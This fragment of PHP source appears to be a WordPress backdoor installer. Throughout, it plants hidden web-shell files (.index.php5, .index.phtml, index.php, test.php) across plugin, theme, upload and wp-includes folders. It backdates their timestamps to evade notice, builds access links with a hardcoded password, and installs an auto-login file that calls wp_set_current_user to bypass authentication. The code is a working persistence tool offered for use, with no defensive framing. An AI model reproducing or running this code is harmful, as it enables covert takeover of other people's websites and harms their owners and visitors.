		rsort($plugins_array);
		//echo $plugins_array[2];
	
		$plugins_array_num=count($plugins_array);
		$plugins_1=$plugins_array[0];
		if($plugins_1!=NULL){
			$plgin_url_array=explode(":",$plugins_1);
			if(array_key_exists("2",$plgin_url_array)){
				$plgin_url_1=$plgin_url_array[1].":".$plgin_url_array[2];
			}else{
				$plgin_url_1=$plgin_url_array[1];
			}
			
			$plgin_url_1=str_replace('\\','/',$plgin_url_1);
			$plgin_url_1=trimall($plgin_url_1);
			if(is_file($plgin_url_1."/index.php")){
				@chmod($plgin_url_1."/index.php",$file_per);
				$plugin_url_con_1=file_get_contents($plgin_url_1."/index.php");
				if(strpos($plugin_url_con_1,"function upfile")){
					$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					echo '<font color="green">'."Plugin ma 1 File OK!".'</font>'."<br/>";
					$chama_all_link.=$_POST['url_root'].$plu_1."/index.php	";
				}else{
					if(is_file($plgin_url_1."/.index.php5")){
						@chmod($plgin_url_1."/.index.php5",$file_per);
						$plugin_url_con_1=file_get_contents($plgin_url_1."/.index.php5");
						if(strpos($plugin_url_con_1,"function upfile")){
							$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
							echo '<font color="green">'."Plugin ma 1 File OK!".'</font>'."<br/>";
							$chama_all_link.=$_POST['url_root'].$plu_1."/.index.php5	";
						}
					}else{
						@file_put_contents($plgin_url_1."/.index.php5",$chama_con);
						@chmod($plgin_url_1."/.index.php5",$file_per);
						@touch($plgin_url_1."/.index.php5",$time);
						@touch($plgin_url_1,$time);
						usleep(500);
					if(is_file($plgin_url_1."/.index.php5")){
						
						$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
						echo '<font color="green">'."Plugin ma 1 File OK!".'</font>'."<br/>";
						 $chama_all_link.=$_POST['url_root'].$plu_1."/.index.php5	";
						//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_1."/.index.php5".'">'.$_POST['url_root'].$plu_1."/.index.php5 is add</a>".'</font>'."<br/>";
					}else{
						echo '<font color="red">'.$plgin_url_1."/.index.php5 is not add".'</font>'."<br/>";
					}
					}
				}
			}else{
				
				
				@file_put_contents($plgin_url_1."/index.php",$chama_con);
				@chmod($plgin_url_1."/index.php",$file_per);
				@touch($plgin_url_1."/index.php",$time);
				@touch($plgin_url_1,$time);
				usleep(500);
				if(is_file($plgin_url_1."/index.php")){
					$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					echo '<font color="green">'."Plugin ma 1 File OK!".'</font>'."<br/>";
					 $chama_all_link.=$_POST['url_root'].$plu_1."/index.php	";
					//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_1."/index.php".'">'.$_POST['url_root'].$plu_1."/index.php is add".'</a></font>'."<br/>";
				}else{
					echo '<font color="red">'.$plgin_url_1."/index.php".'</font>'."<br/>";
				}
			}
			}
			else{
		echo '<font color="red"> NO Plugin 1 </font><br/>';
			}
		}
		
		/////////////////////////////////////////////////////////////////////////////////////
		if(!empty($_POST['chama3'])){
			$plugins_array=array();
		traverseDir($plugins_array,$_POST['root']."wp-content/plugins/".$_POST['chama3']);
		rsort($plugins_array);
		//echo $plugins_array[2];
	
	
		$plugins_array_num=count($plugins_array);
		$plugins_1=$plugins_array[0];
		if($plugins_1!=NULL){
			$plgin_url_array=explode(":",$plugins_1);
			if(array_key_exists("2",$plgin_url_array)){
				$plgin_url_1=$plgin_url_array[1].":".$plgin_url_array[2];
			}else{
				$plgin_url_1=$plgin_url_array[1];
			}
			
			$plgin_url_1=str_replace('\\','/',$plgin_url_1);
			$plgin_url_1=trimall($plgin_url_1);

					if(is_file($plgin_url_1."/.index.php5")){
						@chmod($plgin_url_1."/.index.php5",$file_per);
						$plugin_url_con_1=file_get_contents($plgin_url_1."/.index.php5");
						if(strpos($plugin_url_con_1,"function upfile")){
							$plu_2=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
							echo '<font color="green">'."Plugin ma 2 File OK!".'</font>'."<br/>";
							 $chama_all_link.=$_POST['url_root'].$plu_2."/.index.php5	";
							//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_2."/.index.php5".'">'.$_POST['url_root'].$plu_2."/.index.php5  Exists". '</a></font>'."<br/>";
						}
					}else{
						@file_put_contents($plgin_url_1."/.index.php5",$chama_con);
						@chmod($plgin_url_1."/.index.php5",$file_per);
						@touch($plgin_url_1."/.index.php5",$time);
						@touch($plgin_url_1,$time);
						usleep(500);
					if(is_file($plgin_url_1."/.index.php5")){
						$plu_2=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
						echo '<font color="green">'."Plugin ma 2 File OK!".'</font>'."<br/>";
						 $chama_all_link.=$_POST['url_root'].$plu_2."/.index.php5	";
						//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_2."/.index.php5".'">'.$_POST['url_root'].$plu_2."/.index.php5 is add".'</a></font>'."<br/>";
					}else{
						echo '<font color="red">'.$plgin_url_1."/.index.php5 is not add".'</font>'."<br/>";
					}
					}
		}
		}
		/////////////////////////////////////////////////////////////////////////////themes
		
		
		if(!empty($_POST['chama4'])){
			$plugins_array=array();
		traverseDir($plugins_array,$_POST['root']."wp-content/themes/".$_POST['chama4']);
		rsort($plugins_array);
		//echo $plugins_array[2];
		$plugins_array_num=count($plugins_array);
		$plugins_1=$plugins_array[0];
		if($plugins_1!=NULL){
			$plgin_url_array=explode(":",$plugins_1);
			if(array_key_exists("2",$plgin_url_array)){
				$plgin_url_1=$plgin_url_array[1].":".$plgin_url_array[2];
			}else{
				$plgin_url_1=$plgin_url_array[1];
			}
			
			$plgin_url_1=str_replace('\\','/',$plgin_url_1);
			$plgin_url_1=trimall($plgin_url_1);
			if(is_file($plgin_url_1."/index.php")){
				@chmod($plgin_url_1."/index.php",$file_per);
				$plugin_url_con_1=file_get_contents($plgin_url_1."/index.php");
				if(strpos($plugin_url_con_1,"function upfile")){
					$plu_2=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					echo '<font color="green">'."Themes ma File OK!".'</font>'."<br/>";
					$chama_all_link.=$_POST['url_root'].$plu_2."/index.php	";
					//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_2."/index.php".'">'.$_POST['url_root'].$plu_2."/index.php  Exists".'</a></font>'."<br/>";
				}else{
					if(is_file($plgin_url_1."/.index.php5")){
						@chmod($plgin_url_1."/.index.php5",$file_per);
						$plugin_url_con_1=file_get_contents($plgin_url_1."/.index.php5");
						if(strpos($plugin_url_con_1,"function upfile")){
							$plu_2=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
							echo '<font color="green">'."Themes ma File OK!".'</font>'."<br/>";
							$chama_all_link.=$_POST['url_root'].$plu_2."/.index.php5	";
							//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_2."/.index.php5".'">'.$_POST['url_root'].$plu_2."/.index.php5  Exists". '</a></font>'."<br/>";
						}
					}else{
						@file_put_contents($plgin_url_1."/.index.php5",$chama_con);
						@chmod($plgin_url_1."/.index.php5",$file_per);
						@touch($plgin_url_1."/.index.php5",$time);
						@touch($plgin_url_1,$time);
						usleep(500);
					if(is_file($plgin_url_1."/.index.php5")){
						$plu_2=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
						echo '<font color="green">'."Themes ma File OK!".'</font>'."<br/>";
						$chama_all_link.=$_POST['url_root'].$plu_2."/.index.php5	";
						//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_2."/.index.php5".'">'.$_POST['url_root'].$plu_2."/.index.php5 is add".'</a></font>'."<br/>";
					}else{
						echo '<font color="red">'.$plgin_url_1."/.index.php5 is not add".'</font>'."<br/>";
					}
					}
				}
			}else{
				@file_put_contents($plgin_url_1."/index.php",$chama_con);
				@chmod($plgin_url_1."/index.php",$file_per);
				@touch($plgin_url_1."/index.php",$time);
				@touch($plgin_url_1,$time);
				usleep(500);
				if(is_file($plgin_url_1."/index.php")){
					$plu_2=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					echo '<font color="green">'."Themes ma File OK!".'</font>'."<br/>";
					$chama_all_link.=$_POST['url_root'].$plu_2."/index.php	";
					//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_2."/index.php".'">'.$_POST['url_root'].$plu_2."/index.php is add".'</a></font>'."<br/>";
				}else{
					echo '<font color="red">'.$plgin_url_1."/index.php".'</font>'."<br/>";
				}
			}
			}
			else{
		echo '<font color="red"> NO themes </font><br/>';
	}
		}
		
//////////////////////////////////////////uploads
if(!empty($_POST['chama5'])){
	$plugins_array=array();
		traverseDir($plugins_array,$_POST['root']."wp-content/uploads/".$_POST['chama5']);
		shuffle($plugins_array);
		//echo $plugins_array[2];
		$plugins_array_num=count($plugins_array);
		$plugins_1=$plugins_array[0];
		if($plugins_1!=NULL){
			$plgin_url_array=explode(":",$plugins_1);
			if(array_key_exists("2",$plgin_url_array)){
				$plgin_url_1=$plgin_url_array[1].":".$plgin_url_array[2];
			}else{
				$plgin_url_1=$plgin_url_array[1];
			}
			
			$plgin_url_1=str_replace('\\','/',$plgin_url_1);
			$plgin_url_1=trimall($plgin_url_1);
			if(is_file($plgin_url_1."/index.php")){
				@chmod($plgin_url_1."/index.php",$file_per);
				$plugin_url_con_1=file_get_contents($plgin_url_1."/index.php");
				if(strpos($plugin_url_con_1,"function upfile")){
					$plu_2=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					echo '<font color="green">'."Upload ma 1 File OK!".'</font>'."<br/>";
					$chama_all_link.=$_POST['url_root'].$plu_2."/index.php	";
					//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_2."/index.php".'">'.$_POST['url_root'].$plu_2."/index.php  Exists".'</a></font>'."<br/>";
				}else{
					if(is_file($plgin_url_1."/.index.php5")){
						@chmod($plgin_url_1."/.index.php5",$file_per);
						$plu_2=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
						$plugin_url_con_1=file_get_contents($plgin_url_1."/.index.php5");
						if(strpos($plugin_url_con_1,"function upfile")){
							echo '<font color="green">'."Upload ma 1 File OK!".'</font>'."<br/>";
							$chama_all_link.=$_POST['url_root'].$plu_2."/.index.php5	";
							//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_2."/.index.php5".'">'.$_POST['url_root'].$plu_2."/.index.php5  Exists". '</a></font>'."<br/>";
						}
					}else{
						@file_put_contents($plgin_url_1."/.index.php5",$chama_con);
						@chmod($plgin_url_1."/.index.php5",$file_per);
						$plu_2=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
						@touch($plgin_url_1."/.index.php5",$time);
						@touch($plgin_url_1,$time);
						usleep(500);
					if(is_file($plgin_url_1."/.index.php5")){
						echo '<font color="green">'."Upload ma 1 File OK!".'</font>'."<br/>";
						$chama_all_link.=$_POST['url_root'].$plu_2."/.index.php5	";
						//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_2."/.index.php5".'">'.$_POST['url_root'].$plu_2."/.index.php5 is add".'</a></font>'."<br/>";
					}else{
						echo '<font color="red">'.$plgin_url_1."/.index.php5 is not add".'</font>'."<br/>";
					}
					}
				}
			}else{
				@file_put_contents($plgin_url_1."/index.php",$chama_con);
				@chmod($plgin_url_1."/index.php",$file_per);
				@touch($plgin_url_1."/index.php",$time);
				@touch($plgin_url_1,$time);
				usleep(500);
				if(is_file($plgin_url_1."/index.php")){
					echo '<font color="green">'."Upload ma 1 File OK!".'</font>'."<br/>";
					$plu_2=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					$chama_all_link.=$_POST['url_root'].$plu_2."/index.php	";
					//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_2."/index.php".'">'.$_POST['url_root'].$plu_2."/index.php is add".'</a></font>'."<br/>";
				}else{
					echo '<font color="red">'.$plgin_url_1."/index.php".'</font>'."<br/>";
				}
			}
			}
			else{
		echo '<font color="red"> NO upload1 </font><br/>';
	}
		}		
		
		
		/////////////////////uploda2
		
		if(!empty($_POST['chama6'])){
			$plugins_array=array();
		traverseDir($plugins_array,$_POST['root']."wp-content/uploads/".$_POST['chama6']);
		shuffle($plugins_array);
		//echo $plugins_array[2];
		$plugins_array_num=count($plugins_array);
		$plugins_1=$plugins_array[0];
		if($plugins_1!=NULL){
			$plgin_url_array=explode(":",$plugins_1);
			if(array_key_exists("2",$plgin_url_array)){
				$plgin_url_1=$plgin_url_array[1].":".$plgin_url_array[2];
			}else{
				$plgin_url_1=$plgin_url_array[1];
			}
			
			$plgin_url_1=str_replace('\\','/',$plgin_url_1);
			$plgin_url_1=trimall($plgin_url_1);
					if(is_file($plgin_url_1."/.index.phtml")){
						@chmod($plgin_url_1."/.index.phtml",$file_per);
						$plugin_url_con_1=file_get_contents($plgin_url_1."/.index.phtml");
						if(strpos($plugin_url_con_1,"function upfile")){
							$plu_2=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
							echo '<font color="green">'."Upload ma 2 File OK!".'</font>'."<br/>";
							$chama_all_link.=$_POST['url_root'].$plu_2."/.index.phtml	";
							//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_2."/.index.phtml".'">'.$_POST['url_root'].$plu_2."/.index.phtml  Exists". '</a></font>'."<br/>";
						}
					}else{
						@file_put_contents($plgin_url_1."/.index.phtml",$chama_con);
						@chmod($plgin_url_1."/.index.phtml",$file_per);
						@touch($plgin_url_1."/.index.phtml",$time);
						@touch($plgin_url_1,$time);
						usleep(500);
					if(is_file($plgin_url_1."/.index.phtml")){
						echo '<font color="green">'."Upload ma 2 File OK!".'</font>'."<br/>";
						$plu_2=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
						$chama_all_link.=$_POST['url_root'].$plu_2."/.index.phtml	";
						//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_2."/.index.phtml".'">'.$_POST['url_root'].$plu_2."/.index.phtml is add".'</a></font>'."<br/>";
					}else{
						echo '<font color="red">'.$plgin_url_1."/.index.phtml is not add".'</font>'."<br/>";
					}
					}
			
			}
			else{
		echo '<font color="red"> NO upload2 </font><br/>';
			}
		}
		
		//////////////////////////////includes/
	if(!empty($_POST['chama7'])){
		$plugins_array=array();
		traverseDir($plugins_array,$_POST['root']."wp-includes");
		rsort($plugins_array);
		//echo $plugins_array[2];
		$plugins_array_num=count($plugins_array);
		$plugins_1=$plugins_array[0];
		if($plugins_1!=NULL){
			$plgin_url_array=explode(":",$plugins_1);
			if(array_key_exists("2",$plgin_url_array)){
				$plgin_url_1=$plgin_url_array[1].":".$plgin_url_array[2];
			}else{
				$plgin_url_1=$plgin_url_array[1];
			}
			
			$plgin_url_1=str_replace('\\','/',$plgin_url_1);
			$plgin_url_1=trimall($plgin_url_1);
			if(is_file($plgin_url_1."/index.php")){
				@chmod($plgin_url_1."/index.php",$file_per);
				$plugin_url_con_1=file_get_contents($plgin_url_1."/index.php");
				if(strpos($plugin_url_con_1,"function upfile")){
					$plu_2=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					echo '<font color="green">'."include ma File OK!".'</font>'."<br/>";
					$chama_all_link.=$_POST['url_root'].$plu_2."/index.php	";
					//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_2."/index.php".'">'.$_POST['url_root'].$plu_2."/index.php  Exists".'</a></font>'."<br/>";
				}else{
					if(is_file($plgin_url_1."/.index.php5")){
						@chmod($plgin_url_1."/.index.php5",$file_per);
						$plugin_url_con_1=file_get_contents($plgin_url_1."/.index.php5");
						if(strpos($plugin_url_con_1,"function upfile")){
							$plu_2=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
							echo '<font color="green">'."include ma File OK!".'</font>'."<br/>";
							$chama_all_link.=$_POST['url_root'].$plu_2."/.index.php5	";
							//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_2."/.index.php5".'">'.$_POST['url_root'].$plu_2."/.index.php5  Exists". '</a></font>'."<br/>";
						}
					}else{
						@file_put_contents($plgin_url_1."/.index.php5",$chama_con);
						@chmod($plgin_url_1."/.index.php5",$file_per);
						@touch($plgin_url_1."/.index.php5",$time);
						@touch($plgin_url_1,$time);
						usleep(500);
					if(is_file($plgin_url_1."/.index.php5")){
						$plu_2=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
						echo '<font color="green">'."include ma File OK!".'</font>'."<br/>";
						$chama_all_link.=$_POST['url_root'].$plu_2."/.index.php5	";
						//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_2."/.index.php5".'">'.$_POST['url_root'].$plu_2."/.index.php5 is add".'</a></font>'."<br/>";
					}else{
						echo '<font color="red">'.$plgin_url_1."/.index.php5 is not add".'</font>'."<br/>";
					}
					}
				}
			}else{
				@file_put_contents($plgin_url_1."/index.php",$chama_con);
				@chmod($plgin_url_1."/index.php",$file_per);
				@touch($plgin_url_1."/index.php",$time);
				@touch($plgin_url_1,$time);
				usleep(500);
				if(is_file($plgin_url_1."/index.php")){
					$plu_2=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					echo '<font color="green">'."include ma File OK!".'</font>'."<br/>";
					$chama_all_link.=$_POST['url_root'].$plu_2."/index.php	";
					//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_2."/index.php".'">'.$_POST['url_root'].$plu_2."/index.php is add".'</a></font>'."<br/>";
				}else{
					echo '<font color="red">'.$plgin_url_1."/index.php".'</font>'."<br/>";
				}
			}
			}
	
			else{
		echo '<font color="red"> NO include url </font><br/>';
	}
		}
 
 
 
 
 

	if(!empty($_POST['upload_file1'])){
		$plugins_array=array();
		traverseDir($plugins_array,$_POST['root']."wp-content/plugins/".$_POST['upload_file1']);
		rsort($plugins_array);
		//echo $plugins_array[2];
	
		$plugins_array_num=count($plugins_array);
		shuffle($plugins_array);
		$plugins_1=$plugins_array[0];
		if($plugins_1!=NULL){
			$plgin_url_array=explode(":",$plugins_1);
			if(array_key_exists("2",$plgin_url_array)){
				$plgin_url_1=$plgin_url_array[1].":".$plgin_url_array[2];
			}else{
				$plgin_url_1=$plgin_url_array[1];
			}
			
			$plgin_url_1=str_replace('\\','/',$plgin_url_1);
			$plgin_url_1=trimall($plgin_url_1);
			if(is_file($plgin_url_1."/index.php")){
				@chmod($plgin_url_1."/index.php",$file_per);
				$plugin_url_con_1=file_get_contents($plgin_url_1."/index.php");
				if(strpos($plugin_url_con_1,"ddbc825a724afc8d08cfdbf82d4a3a13")){
					$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					echo '<font color="green">'."Upload File 1 OK!".'</font>'."<br/>";
					$chama_all_link.= $_POST['url_root'].$plu_1."/index.php?pass=A4bGff!dV5	";
					//echo '<font color="green">'.$_POST['url_root'].$plu_1."/index.php Upload Exists".'</font>'."<br/>";
				}else{
					if(is_file($plgin_url_1."/test.php")){
						@chmod($plgin_url_1."/test.php",$file_per);
						$plugin_url_con_1=file_get_contents($plgin_url_1."/test.php");
						if(strpos($plugin_url_con_1,"ddbc825a724afc8d08cfdbf82d4a3a13")){
						$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
						echo '<font color="green">'."Upload File 1 OK!".'</font>'."<br/>";
						$chama_all_link.= $_POST['url_root'].$plu_1."/test.php?pass=A4bGff!dV5	";
						//echo '<font color="green">'.$_POST['url_root'].$plu_1."/test.php  Upload Exists". '</font>'."<br/>";
						}
					}else{
						@file_put_contents($plgin_url_1."/test.php",$upload_con);
						@chmod($plgin_url_1."/test.php",$file_per);
						@touch($plgin_url_1."/test.php",$time);
						@touch($plgin_url_1,$time);
						usleep(500);
					if(is_file($plgin_url_1."/test.php")){
						
						$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
						echo '<font color="green">'."Upload File 1 OK!".'</font>'."<br/>";
						$chama_all_link.= $_POST['url_root'].$plu_1."/test.php?pass=A4bGff!dV5	";
						//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_1."/test.php?pass=A4bGff!dV5".'">'.$_POST['url_root'].$plu_1."/test.php is add</a>".'</font>'."<br/>";
					}else{
						echo '<font color="red">'.$plgin_url_1."/test.php is not add".'</font>'."<br/>";
					}
					}
				}
			}else{
				
				
				@file_put_contents($plgin_url_1."/index.php",$upload_con);
				@chmod($plgin_url_1."/index.php",$file_per);
				@touch($plgin_url_1."/index.php",$time);
				@touch($plgin_url_1,$time);
				usleep(500);
				if(is_file($plgin_url_1."/index.php")){
					$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					echo '<font color="green">'."Upload File 1 OK!".'</font>'."<br/>";
					$chama_all_link.= $_POST['url_root'].$plu_1."/index.php?pass=A4bGff!dV5	";
					//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_1."/index.php?pass=A4bGff!dV5".'">'.$_POST['url_root'].$plu_1."/index.php is add".'</a></font>'."<br/>";
				}else{
					echo '<font color="red">'.$plgin_url_1."/index.php".'</font>'."<br/>";
				}
			}
			}
			else{
		echo '<font color="red"> NO upload Plugin 1 </font><br/>';
			}
		}
		
		/////////////////////////////////////////////
		if(!empty($_POST['upload_file2'])){
		$plugins_array=array();
		traverseDir($plugins_array,$_POST['root']."wp-content/themes/".$_POST['upload_file2']);
		rsort($plugins_array);
		//echo $plugins_array[2];
	
		$plugins_array_num=count($plugins_array);
		shuffle($plugins_array);
		$plugins_1=$plugins_array[0];
		if($plugins_1!=NULL){
			$plgin_url_array=explode(":",$plugins_1);
			if(array_key_exists("2",$plgin_url_array)){
				$plgin_url_1=$plgin_url_array[1].":".$plgin_url_array[2];
			}else{
				$plgin_url_1=$plgin_url_array[1];
			}
			
			$plgin_url_1=str_replace('\\','/',$plgin_url_1);
			$plgin_url_1=trimall($plgin_url_1);
			if(is_file($plgin_url_1."/index.php")){
				@chmod($plgin_url_1."/index.php",$file_per);
				$plugin_url_con_1=file_get_contents($plgin_url_1."/index.php");
				if(strpos($plugin_url_con_1,"ddbc825a724afc8d08cfdbf82d4a3a13")){
					$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					echo '<font color="green">'."Upload File 2 OK!".'</font>'."<br/>";
					$chama_all_link.=$_POST['url_root'].$plu_1."/index.php?pass=A4bGff!dV5	";
					//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_1."/index.php?pass=A4bGff!dV5".'">'.$_POST['url_root'].$plu_1."/index.php Upload Exists".'</a></font>'."<br/>";
				}else{
					if(is_file($plgin_url_1."/test.php")){
						@chmod($plgin_url_1."/test.php",$file_per);
						$plugin_url_con_1=file_get_contents($plgin_url_1."/test.php");
						if(strpos($plugin_url_con_1,"ddbc825a724afc8d08cfdbf82d4a3a13")){
						$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
						echo '<font color="green">'."Upload File 2 OK!".'</font>'."<br/>";
						$chama_all_link.=$_POST['url_root'].$plu_1."/test.php?pass=A4bGff!dV5	";
						//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_1."/test.php?pass=A4bGff!dV5".'">'.$_POST['url_root'].$plu_1."/test.php  Upload Exists". '</a></font>'."<br/>";
						}
					}else{
						@file_put_contents($plgin_url_1."/test.php",$upload_con);
						@chmod($plgin_url_1."/test.php",$file_per);
						@touch($plgin_url_1."/test.php",$time);
						@touch($plgin_url_1,$time);
						usleep(500);
					if(is_file($plgin_url_1."/test.php")){
						
						$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
						echo '<font color="green">'."Upload File 2 OK!".'</font>'."<br/>";
						$chama_all_link.=$_POST['url_root'].$plu_1."/test.php?pass=A4bGff!dV5	";
						//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_1."/test.php?pass=A4bGff!dV5".'">'.$_POST['url_root'].$plu_1."/test.php is add</a>".'</font>'."<br/>";
					}else{
						echo '<font color="red">'.$plgin_url_1."/test.php is not add".'</font>'."<br/>";
					}
					}
				}
			}else{
				
				
				@file_put_contents($plgin_url_1."/index.php",$upload_con);
				
				@chmod($plgin_url_1."/index.php",$file_per);
				@touch($plgin_url_1."/index.php",$time);
				@touch($plgin_url_1,$time);
				usleep(500);
				if(is_file($plgin_url_1."/index.php")){
					$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					echo '<font color="green">'."Upload File 2 OK!".'</font>'."<br/>";
					$chama_all_link.=$_POST['url_root'].$plu_1."/index.php?pass=A4bGff!dV5	";
					//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_1."/index.php?pass=A4bGff!dV5".'">'.$_POST['url_root'].$plu_1."/index.php is add".'</a></font>'."<br/>";
				}else{
					echo '<font color="red">'.$plgin_url_1."/index.php".'</font>'."<br/>";
				}
			}
			}
			else{
		echo '<font color="red"> NO upload Plugin 1 </font><br/>';
			}
		}
		
		
		
		///////////////////////////////////////////////////////////
		if(!empty($_POST['upload_file3'])){
		$plugins_array=array();
		traverseDir($plugins_array,$_POST['root']."wp-content/uploads/".$_POST['upload_file3']);
		rsort($plugins_array);
		//echo $plugins_array[2];
	
		$plugins_array_num=count($plugins_array);
		shuffle($plugins_array);
		$plugins_1=$plugins_array[0];
		if($plugins_1!=NULL){
			$plgin_url_array=explode(":",$plugins_1);
			if(array_key_exists("2",$plgin_url_array)){
				$plgin_url_1=$plgin_url_array[1].":".$plgin_url_array[2];
			}else{
				$plgin_url_1=$plgin_url_array[1];
			}
			
			$plgin_url_1=str_replace('\\','/',$plgin_url_1);
			$plgin_url_1=trimall($plgin_url_1);
			if(is_file($plgin_url_1."/index.php")){
				@chmod($plgin_url_1."/index.php",$file_per);
				$plugin_url_con_1=file_get_contents($plgin_url_1."/index.php");
				if(strpos($plugin_url_con_1,"ddbc825a724afc8d08cfdbf82d4a3a13")){
					$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					echo '<font color="green">'."Upload File 3 OK!".'</font>'."<br/>";
					$chama_all_link.=$_POST['url_root'].$plu_1."/index.php?pass=A4bGff!dV5	";
					//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_1."/index.php?pass=A4bGff!dV5".'">'.$_POST['url_root'].$plu_1."/index.php Upload Exists".'</a></font>'."<br/>";
				}else{
					if(is_file($plgin_url_1."/test.php")){
						@chmod($plgin_url_1."/test.php",$file_per);
						$plugin_url_con_1=file_get_contents($plgin_url_1."/test.php");
						if(strpos($plugin_url_con_1,"ddbc825a724afc8d08cfdbf82d4a3a13")){
							$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
							echo '<font color="green">'."Upload File 3 OK!".'</font>'."<br/>";
							$chama_all_link.=$_POST['url_root'].$plu_1."/test.php?pass=A4bGff!dV5	";
							//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_1."/test.php?pass=A4bGff!dV5".'">'.$_POST['url_root'].$plu_1."/test.php  Upload Exists". '</a></font>'."<br/>";
						}
					}else{
						@file_put_contents($plgin_url_1."/test.php",$upload_con);
						@chmod($plgin_url_1."/test.php",$file_per);
						@touch($plgin_url_1."/test.php",$time);
						@touch($plgin_url_1,$time);
						usleep(500);
					if(is_file($plgin_url_1."/test.php")){
						
						$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
						echo '<font color="green">'."Upload File 3 OK!".'</font>'."<br/>";
						$chama_all_link.=$_POST['url_root'].$plu_1."/test.php?pass=A4bGff!dV5	";
						//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_1."/test.php?pass=A4bGff!dV5".'">'.$_POST['url_root'].$plu_1."/test.php is add</a>".'</font>'."<br/>";
					}else{
						echo '<font color="red">'.$plgin_url_1."/test.php is not add".'</font>'."<br/>";
					}
					}
				}
			}else{
				
				
				@file_put_contents($plgin_url_1."/index.php",$upload_con);
				@chmod($plgin_url_1."/index.php",$file_per);
				@touch($plgin_url_1."/index.php",$time);
				@touch($plgin_url_1,$time);
				usleep(500);
				if(is_file($plgin_url_1."/index.php")){
					$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					echo '<font color="green">'."Upload File 3 OK!".'</font>'."<br/>";
					$chama_all_link.=$_POST['url_root'].$plu_1."/index.php?pass=A4bGff!dV5	";
					//echo '<font color="green"><a href="'.$_POST['url_root'].$plu_1."/index.php?pass=A4bGff!dV5".'">'.$_POST['url_root'].$plu_1."/index.php is add".'</a></font>'."<br/>";
				}else{
					echo '<font color="red">'.$plgin_url_1."/index.php".'</font>'."<br/>";
				}
			}
			}
			else{
		echo '<font color="red"> NO upload Plugin 1 </font><br/>';
			}
		}
		//////////////////////////auto login
		if(is_file($_POST['root']."/wp-content/plugins/test.php")){
			$auto_login_get=file_get_contents($_POST['root']."/wp-content/plugins/test.php");
			if(strpos($auto_login_get,'wp_set_current_user')!==false){
				echo '<font color="green">'."Auto Login Is Exists!".'</font>'."<br/>";
			}
			else{
				@unlink($_POST['root']."/wp-content/plugins/test.php");
				@file_put_contents($_POST['root']."/wp-content/plugins/test.php",$auto_login);
				@chmod($_POST['root']."/wp-content/plugins/test.php",$file_per);
				@touch($_POST['root']."/wp-content/plugins/test.php",$time);
				@touch($_POST['root']."/wp-content/plugins/",$time);
				if(strpos($auto_login_get,'wp_set_current_user')!==false){
					echo '<font color="green">'.$_POST['url_root'].'wp-content/plugins/test.php Auto Login Is add!'.'</a></font>'."<br/>";
					
				}else{
					echo '<font color="red">'."Auto Login Is not add!".'</font>'."<br/>";
				}
			}
		}
			else{
			@file_put_contents($_POST['root']."/wp-content/plugins/test.php",$auto_login);
			@chmod($_POST['root']."/wp-content/plugins/test.php",$file_per);
			@touch($_POST['root']."/wp-content/plugins/test.php",$time);
